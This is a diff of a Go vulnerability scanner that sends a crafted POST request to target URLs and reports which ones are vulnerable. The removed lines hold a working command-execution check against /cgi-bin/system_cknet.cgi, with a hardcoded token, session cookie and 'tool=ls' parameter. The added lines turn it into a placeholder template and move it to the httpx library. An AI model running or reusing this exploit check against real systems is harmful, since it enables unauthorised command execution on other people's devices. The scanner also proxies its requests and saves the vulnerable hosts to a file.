@@ -5,9 +5,11 @@ import (
 	"container/list"
 	"fmt"
 	"github.com/fatih/color"
+	"github.com/gogama/httpx"
+	"github.com/gogama/httpx/request"
+	"github.com/gogama/httpx/timeout"
 	"github.com/urfave/cli"
 	"io"
-	"io/ioutil"
 	"log"
 	"net/http"
 	"net/url"
@@ -32,34 +34,31 @@ type printer struct {
 }
 
 func attack_from_url(target_url *string) string {
-	path := "/cgi-bin/system_cknet.cgi"
+	path := "/xxx/xxx?admin=xxxx"
 	targetUrl := *target_url + path
-	body := "token=7033cdee9c469742e7bb5d3c49d40a0a&addr=./&tool=ls&protocol=4"
+	body := "token=xxxx"
 	reader := strings.NewReader(body)
-	request, err := http.NewRequest("POST", targetUrl, reader)
+	myrequest, err := request.NewPlan("POST", targetUrl, reader)
 	if err != nil {
 		panic(err)
 	}
-	request.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
-	request.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0")
-	request.Header.Set("Cookie", "login=578a5146965aacad4eb8f2b61cd6c5465654fccec93dc316b6fae1be3262bdc4; flag=")
+	myrequest.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0")
 	client := set_proxy()
-	resp, err := client.Do(request)
+	resp, err := client.Do(myrequest)
 	if err != nil {
 		print.red.Println("[-] " + *target_url + " 访问错误")
 	} else {
-		bodys, err := ioutil.ReadAll(resp.Body)
+		bodys, err := request.BodyBytes(resp.Body)
 		if err != nil {
 			panic(err)
 		}
 		body_data := string(bodys)
-		if strings.Contains(body_data, "\"data\":\"ls:") {
-			print.green.Println("[+] " + *target_url + " 存在chonge任意命令执行漏洞")
+		if strings.Contains(body_data, "xxx") && resp.StatusCode() == 200 {
+			print.green.Println("[+] " + *target_url + " 存在漏洞")
 			return *target_url
 		} else {
-			print.yellow.Println("[-] " + *target_url + " 不存在chonge任意命令执行漏洞")
+			print.yellow.Println("[-] " + *target_url + " 不存在漏洞")
 		}
-		defer resp.Body.Close()
 	}
 	return ""
 }
@@ -145,18 +144,21 @@ func write_file(success_url_list *list.List) {
 	defer write.Flush()
 }
 
-func set_proxy() *http.Client {
+func set_proxy() *httpx.Client {
 	if proxy != "" {
 		proxyAddress, _ := url.Parse(proxy)
-		client := &http.Client{
+		doer := &http.Client{
 			Transport: &http.Transport{
 				Proxy: http.ProxyURL(proxyAddress),
 			},
-			Timeout: 5 * time.Second,
+		}
+		client := &httpx.Client{
+			HTTPDoer:      doer,
+			TimeoutPolicy: timeout.Fixed(30 * time.Second),
 		}
 		return client
 	} else {
-		client := &http.Client{Timeout: 5 * time.Second}
+		client := &httpx.Client{TimeoutPolicy: timeout.Fixed(30 * time.Second)}
 		return client
 	}
 }
